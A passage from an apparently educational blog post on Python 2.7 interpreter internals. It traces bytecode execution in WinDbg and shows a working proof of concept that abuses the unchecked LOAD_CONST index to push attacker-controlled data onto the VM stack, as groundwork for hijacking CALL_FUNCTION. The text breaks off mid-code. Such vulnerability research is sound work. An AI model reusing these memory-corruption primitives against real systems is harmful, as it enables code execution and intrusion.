</span><span class='line'>eax=00000017 ebx=00000000 ecx=00000016 edx=0000000f esi=025eafc0 edi=00000000
</span><span class='line'>eip=1e0eccf5 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
</span><span class='line'>python27!PyEval_EvalFrameEx+0xa45:
</span><span class='line'>1e0eccf5 8b75f8          mov     esi,dword ptr [ebp-8] ss:002b:026bf0d8=a0aa5e02
</span><span class='line'>...
</span><span class='line'>0:000&gt;
</span><span class='line'>eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=00000000
</span><span class='line'>eip=1e0eccfb esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
</span><span class='line'>python27!PyEval_EvalFrameEx+0xa4b:
</span><span class='line'>1e0eccfb 8b7dfc          mov     edi,dword ptr [ebp-4] ss:002b:026bf0dc=c0af5e02
</span><span class='line'>0:000&gt;
</span><span class='line'>eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=025eafc0
</span><span class='line'>eip=1e0eccfe esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
</span><span class='line'>python27!PyEval_EvalFrameEx+0xa4e:
</span><span class='line'>1e0eccfe 83ed04          sub     ebp,4
</span></code></pre></td></tr></table></div></figure>


<p>A bit further we have our string concatenation:</p>

<figure class='code'><figcaption><span>String concatenation in string_concatenate</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=025eafc0 ebx=00000000 ecx=0027fcd0 edx=026bef98 esi=025eaaa0 edi=025eafc0
</span><span class='line'>eip=1e0eb733 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
</span><span class='line'>python27!PyEval_SliceIndex+0x813:
</span><span class='line'>1e0eb733 e83881fcff      call    python27!PyString_Concat (1e0b3870)
</span><span class='line'>0:000&gt; dd esp l3
</span><span class='line'>0027fcb8  0027fcd0 025eafc0 025eaaa0
</span><span class='line'>0:000&gt; p
</span><span class='line'>eax=025eaaa0 ebx=00000000 ecx=00000064 edx=000004fb esi=025eaaa0 edi=025eafc0
</span><span class='line'>eip=1e0eb738 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
</span><span class='line'>python27!PyEval_SliceIndex+0x818:
</span><span class='line'>1e0eb738 8b442418        mov     eax,dword ptr [esp+18h] ss:002b:0027fcd0=c0aa5e02
</span><span class='line'>0:000&gt; db poi(0027fcd0) l1f
</span><span class='line'>025eaac0  01 00 00 00 98 67 22 1e-0a 00 00 00 ff ff ff ff  .....g&quot;.........
</span><span class='line'>025eaad0  00 00 00 00 48 65 6c 6c-6f 57 6f 72 6c 64 00     ....HelloWorld.
</span></code></pre></td></tr></table></div></figure>


<p>And the last part of the case is to push the resulting string onto the virtual stack (<em>SET_TOP</em> operation):</p>

<figure class='code'><figcaption><span>Push the resulting object onto the virtual stack</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=025eaac0 ebx=025eaac0 ecx=00000005 edx=000004fb esi=025eaaa0 edi=025eafc0
</span><span class='line'>eip=1e0ecb82 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl nz ac po cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200213
</span><span class='line'>python27!PyEval_EvalFrameEx+0x8d2:
</span><span class='line'>1e0ecb82 895dfc          mov     dword ptr [ebp-4],ebx ss:002b:026bf0d8=a0aa5e02
</span></code></pre></td></tr></table></div></figure>


<p>Last part of our deep dive, the <em>RETURN_VALUE</em> opcode:</p>

<figure class='code'><figcaption><span>Fetching the RETURN_VALUE opcode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=025eaac0 ebx=025eafc0 ecx=025ea91b edx=026bef98 esi=025eaac0 edi=025eafc0
</span><span class='line'>eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b2:
</span><span class='line'>1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91b=53
</span></code></pre></td></tr></table></div></figure>


<p>All right, at least now you have a more precise idea about how that Python virtual machine works, and more importantly how you can directly debug it without symbols. Of course, you can download the debug symbols on Linux and use that information in gdb ; it should make your life easier (&hellip;.but I hate gdb man&hellip;).</p>

<p>Note that I would love very much to have a debugger at the Python bytecode level, it would be much easier than instrumenting the interpreter. If you know one ping me! If you build one ping me too :&ndash;).</p>

<h1>The bug</h1>

<p>Here is the bug, spot it and give it some love:</p>

<figure class='code'><figcaption><span>LOAD_CONST bug</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#ifndef Py_DEBUG</span>
</span><span class='line'><span class="cp">#define GETITEM(v, i) PyTuple_GET_ITEM((PyTupleObject *)(v), (i))</span>
</span><span class='line'><span class="cp">#else</span>
</span><span class='line'><span class="c1">//...</span>
</span><span class='line'><span class="cm">/* Macro, trading safety for speed &lt;-- LOL, :) */</span>
</span><span class='line'><span class="cp">#define PyTuple_GET_ITEM(op, i) (((PyTupleObject *)(op))-&gt;ob_item[i])</span>
</span><span class='line'>
</span><span class='line'><span class="k">case</span> <span class="n">LOAD_CONST</span>:
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="n">GETITEM</span><span class="p">(</span><span class="n">consts</span><span class="p">,</span> <span class="n">oparg</span><span class="p">);</span>
</span><span class='line'>  <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>  <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>  <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>This may be a bit obscure for you, but keep in mind we control the index <em>oparg</em> and the content of <em>consts</em>. That means we can just push <em>untrusted</em> data on the virtual stack of the VM: brilliant. Getting a crash out of this bug is fairly easy, try to run these lines (on a Python 2.7 distribution):</p>

<figure class='code'><figcaption><span>craaaaash</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">opcode</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">types</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
</span><span class='line'>  <span class="k">pass</span>
</span><span class='line'>
</span><span class='line'><span class="n">a</span><span class="o">.</span><span class="n">func_code</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span>
</span><span class='line'>  <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;EXTENDED_ARG&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\xef\xbe</span><span class="s">&#39;</span> <span class="o">+</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;LOAD_CONST&#39;</span><span class="p">])</span>   <span class="o">+</span> <span class="s">&#39;</span><span class="se">\xad\xde</span><span class="s">&#39;</span><span class="p">,</span>
</span><span class='line'>  <span class="p">(),</span> <span class="p">(),</span> <span class="p">(),</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'><span class="n">a</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>..and as expected you get a fault (<em>oparg</em> is <em>edi</em>):</p>

<figure class='code'><figcaption><span>craaaaaaash</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>(2058.2108): Access violation - code c0000005 (!!! second chance !!!)
</span><span class='line'>[...]
</span><span class='line'>eax=01cb1030 ebx=00000000 ecx=00000063 edx=00000046 esi=1e222c0c edi=beefdead
</span><span class='line'>eip=1e0ec5f7 esp=0027e7f8 ebp=0273a9f0 iopl=0         nv up ei ng nz na pe cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
</span><span class='line'>python27!PyEval_EvalFrameEx+0x347:
</span><span class='line'>1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????
</span></code></pre></td></tr></table></div></figure>


<p>By the way, some readers might have caught the same type of bug in <em>LOAD_FAST</em> with the <em>fastlocals</em> array ; those readers are definitely right :).</p>

<h1>Walking through the PoC</h1>

<p>OK, so if you look only at the faulting instruction you could say that the bug is minor and we won&rsquo;t be able to turn it into something &ldquo;useful&rdquo;. But the essential piece when you want to exploit a software is to actually completely understand how it works. Then you are more capable of turning bugs that seems useless into interesting primitives.</p>

<p>As we said several times, from Python code you can&rsquo;t really push any value you want onto the Python virtual stack, obviously. The machine is only dealing with Python objects. However, with this bug we can corrupt the virtual stack by pushing arbitrary data that we control. If you do that well, you can end up causing the Python VM to call whatever address you want. That&rsquo;s exactly what I did back when I wrote <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py">python27_abuse_vm_to_execute_x86_code.py</a>.</p>

<p>In Python we are really lucky because we can control a lot of things in memory and we have natively a way to &ldquo;leak&rdquo; (I shouldn&rsquo;t call that a leak though because it&rsquo;s a feature) the address of a Python object with the function <em>id</em>. So basically we can do stuff, we can do it reliably and we can manage to not break the interpreter, like bosses.</p>

<h2>Pushing attacker-controlled data on the virtual stack</h2>

<p>We control <em>oparg</em> and the content of the tuple <em>consts</em>. We can also find out the address of that tuple. So we can have a Python string object that stores an arbitrary value, let&rsquo;s say <em>0xdeadbeef</em> and it will be pushed on the virtual stack.</p>

<p>Let&rsquo;s do that in Python now:</p>

<figure class='code'><figcaption><span>Pushing controlled value on the virtual stack</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">opcode</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">types</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pshort</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;H&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">a</span><span class="p">():</span>
</span><span class='line'>  <span class="k">pass</span>
</span><span class='line'>
</span><span class='line'><span class="n">consts</span> <span class="o">=</span> <span class="p">()</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\xef\xbe\xad\xde</span><span class="s">&#39;</span>
</span><span class='line'><span class="n">address_s</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">+</span> <span class="mi">20</span> <span class="c"># 20 is the offset of the array of byte we control in the string</span>
</span><span class='line'><span class="n">address_consts</span> <span class="o">=</span> <span class="nb">id</span><span class="p">(</span><span class="n">consts</span><span class="p">)</span>
</span><span class='line'><span class="c"># python27!PyEval_EvalFrameEx+0x347:</span>
</span><span class='line'><span class="c"># 1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????</span>
</span><span class='line'><span class="n">offset</span> <span class="o">=</span> <span class="p">((</span><span class="n">address_s</span> <span class="o">-</span> <span class="n">address_consts</span> <span class="o">-</span> <span class="mh">0xC</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span><span class='line'><span class="n">high</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span>
</span><span class='line'><span class="n">low</span> <span class="o">=</span>  <span class="n">offset</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;Consts tuple @</span><span class="si">%#.8x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">address_consts</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;Address of controled data @</span><span class="si">%#.8x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">address_s</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;Offset between const and our object: @</span><span class="si">%#.8x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">offset</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;Going to push [</span><span class="si">%#.8x</span><span class="s">] on the virtual stack&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">address_consts</span> <span class="o">+</span> <span class="p">(</span><span class="n">address_s</span> <span class="o">-</span> <span class="n">address_consts</span> <span class="o">-</span> <span class="mh">0xC</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">a</span><span class="o">.</span><span class="n">func_code</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span>
</span><span class='line'>  <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;EXTENDED_ARG&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">high</span><span class="p">)</span> <span class="o">+</span>
</span><span class='line'>  <span class="nb">chr</span><span class="p">(</span><span class="n">opcode</span><span class="o">.</span><span class="n">opmap</span><span class="p">[</span><span class="s">&#39;LOAD_CONST&#39;</span><span class="p">])</span>   <span class="o">+</span> <span class="n">pshort</span><span class="p">(</span><span class="n">low</span><span class="p">),</span>
</span><span class='line'>  <span class="n">consts</span><span class="p">,</span> <span class="p">(),</span> <span class="p">(),</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;&#39;</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'><span class="n">a</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>..annnnd..</p>

<figure class='code'><figcaption><span>debugger view</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>D:\&gt;python 1.py
</span><span class='line'>Consts tuple @0x01db1030
</span><span class='line'>Address of controled data @0x022a0654
</span><span class='line'>Offset between const and our object: @0x0013bd86
</span><span class='line'>Going to push [0x022a0654] on the virtual stack
</span><span class='line'>
</span><span class='line'>*JIT debugger pops*
</span><span class='line'>
</span><span class='line'>eax=01db1030 ebx=00000000 ecx=00000063 edx=00000046 esi=deadbeef edi=0013bd86
</span><span class='line'>eip=1e0ec5fb esp=0027fc68 ebp=01e63fc0 iopl=0         nv up ei ng nz na pe cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
</span><span class='line'>python27!PyEval_EvalFrameEx+0x34b:
</span><span class='line'>1e0ec5fb ff06            inc     dword ptr [esi]      ds:002b:deadbeef=????????
</span><span class='line'>0:000&gt; ub eip l1
</span><span class='line'>python27!PyEval_EvalFrameEx+0x347:
</span><span class='line'>1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch]
</span><span class='line'>0:000&gt; ? eax+edi*4+c
</span><span class='line'>Evaluate expression: 36308564 = 022a0654
</span><span class='line'>0:000&gt; dd 022a0654 l1
</span><span class='line'>022a0654  deadbeef &lt;- the data we control in our PyStringObject
</span><span class='line'>0:000&gt; dps 022a0654-0n20 l2
</span><span class='line'>022a0640  00000003
</span><span class='line'>022a0644  1e226798 python27!PyString_Type
</span></code></pre></td></tr></table></div></figure>


<p>Perfect, we control a part of the virtual stack :).</p>

<h2>Game over, LOAD_FUNCTION</h2>

<p>Once you control the virtual stack, the only limit is your imagination and the ability you have to find an interesting spot in the virtual machine. My idea was to use the <em>CALL_FUNCTION</em> opcode to craft a <em>PyFunctionObject</em> somehow, push it onto the virtual stack and to use the magic opcode.</p>

<figure class='code'><figcaption><span>PyFunctionObject definition</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">PyObject_HEAD</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_code</span><span class="p">;</span>  <span class="cm">/* A code object */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_globals</span><span class="p">;</span> <span class="cm">/* A dictionary (other mappings won&#39;t do) */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_defaults</span><span class="p">;</span>  <span class="cm">/* NULL or a tuple */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_closure</span><span class="p">;</span> <span class="cm">/* NULL or a tuple of cell objects */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_doc</span><span class="p">;</span>   <span class="cm">/* The __doc__ attribute, can be anything */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_name</span><span class="p">;</span>  <span class="cm">/* The __name__ attribute, a string object */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_dict</span><span class="p">;</span>  <span class="cm">/* The __dict__ attribute, a dict or NULL */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_weakreflist</span><span class="p">;</span> <span class="cm">/* List of weak references */</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_module</span><span class="p">;</span>  <span class="cm">/* The __module__ attribute, can be anything */</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyFunctionObject</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The thing is, as we saw earlier, the virtual machine usually ensures the type of the object it handles. If the type checking fails, the function bails out and we are not happy, at all. It means we would need an information-leak to obtain a pointer to the PyFunction_Type static variable.</p>

<p>Fortunately for us, the CALL_FUNCTION can still be abused without knowing that magic pointer to craft correctly our object. Let&rsquo;s go over the source code to illustrate my sayings:</p>

<figure class='code'><figcaption><span>CALL_FUNCTION</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">case</span> <span class="n">CALL_FUNCTION</span>:
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">**</span><span class="n">sp</span><span class="p">;</span>
</span><span class='line'>  <span class="n">PCALL</span><span class="p">(</span><span class="n">PCALL_ALL</span><span class="p">);</span>
</span><span class='line'>  <span class="n">sp</span> <span class="o">=</span> <span class="n">stack_pointer</span><span class="p">;</span>
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="n">call_function</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sp</span><span class="p">,</span> <span class="n">oparg</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span>
</span><span class='line'><span class="nf">call_function</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">***</span><span class="n">pp_stack</span><span class="p">,</span> <span class="kt">int</span> <span class="n">oparg</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">na</span> <span class="o">=</span> <span class="n">oparg</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">nk</span> <span class="o">=</span> <span class="p">(</span><span class="n">oparg</span><span class="o">&gt;&gt;</span><span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">na</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">nk</span><span class="p">;</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">**</span><span class="n">pfunc</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">pp_stack</span><span class="p">)</span> <span class="o">-</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func</span> <span class="o">=</span> <span class="o">*</span><span class="n">pfunc</span><span class="p">;</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">w</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">PyCFunction_Check</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">nk</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// ..Nope..</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">PyMethod_Check</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">PyMethod_GET_SELF</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="c1">// ..Still Nope...</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">PyFunction_Check</span><span class="p">(</span><span class="n">func</span><span class="p">))</span>
</span><span class='line'>      <span class="c1">// Nope!</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">x</span> <span class="o">=</span> <span class="n">do_call</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">pp_stack</span><span class="p">,</span> <span class="n">na</span><span class="p">,</span> <span class="n">nk</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="n">PyObject</span> <span class="o">*</span>
</span><span class='line'><span class="n">do_call</span><span class="p">(</span><span class="n">PyObject</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="n">PyObject</span> <span class="o">***</span><span class="n">pp_stack</span><span class="p">,</span> <span class="kt">int</span> <span class="n">na</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nk</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="c1">// ...</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">PyCFunction_Check</span><span class="p">(</span><span class="n">func</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// Nope</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span>
